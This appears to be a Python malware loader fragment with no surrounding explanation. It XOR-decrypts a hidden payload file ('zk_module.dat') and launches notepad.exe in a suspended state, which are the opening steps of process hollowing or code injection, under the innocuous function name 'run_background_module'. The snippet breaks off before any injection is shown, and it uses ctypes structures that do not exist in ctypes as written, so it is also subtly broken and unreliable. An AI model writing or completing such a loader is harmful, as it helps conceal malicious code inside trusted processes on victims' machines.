import ctypes, struct

def xor_decrypt(data, key=0x5A):
    return bytes([b ^ key for b in data])

def run_background_module():
    with open("zk_module.dat", "rb") as f:
        encrypted = f.read()
    decrypted = xor_decrypt(encrypted)

    kernel32 = ctypes.windll.kernel32
    si = ctypes.STARTUPINFO()
    pi = ctypes.PROCESS_INFORMATION()
    exe_path = "C:\\Windows\\System32\\notepad.exe"
    creation_flags = 0x4
    kernel32.CreateProcessW(None, exe_path, None, None, False, creation_flags, None, None, ctypes.byref(si), ctypes.byref(pi))
